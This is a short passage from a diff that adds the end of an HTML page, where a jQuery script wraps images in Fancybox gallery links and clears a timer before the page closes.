+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
+
+</html>
